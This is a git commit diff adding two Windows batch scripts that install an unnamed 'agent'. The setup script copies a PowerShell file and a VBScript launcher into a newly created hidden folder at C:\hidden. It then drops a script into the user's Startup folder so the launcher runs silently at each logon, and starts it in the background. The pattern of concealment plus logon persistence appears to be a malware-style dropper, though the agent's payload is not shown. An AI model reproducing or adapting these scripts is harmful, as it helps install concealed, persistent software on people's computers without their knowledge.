08a8e2e9dbe012cb63e96dd1838f277b48faea7b
ThePyromancer23 <thepyromancer23@gmail.com>
2023-12-18 13:23:05 -0600

    added setup scripts for agent

---
+++ agent/setup.bat
@@ -0,0 +1,20 @@
+@echo off
+cd /d %~dp0
+set "destination_folder=C:\"
+
+if exist "agent.ps1" (
+    mkdir "%destination_folder%\hidden\"
+    attrib +h "%destination_folder%\hidden"
+    copy "agent.ps1" "%destination_folder%\hidden\"
+    copy "launcher.vbs" "%destination_folder%\hidden\"
+    echo File copied successfully to %destination_folder%\hidden\.
+)
+set "destination_folder=%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+if exist "startup_script.bat" (
+    copy "startup_script.bat" "%destination_folder%"
+    echo File copied successfully to %destination_folder%.
+)
+echo Launching agent.
+start /B wscript "C:\hidden\launcher.vbs"
+
+pause
---
+++ agent/startup_script.bat
@@ -0,0 +1,2 @@
+@echo off
+start /B wscript "C:\hidden\launcher.vbs"
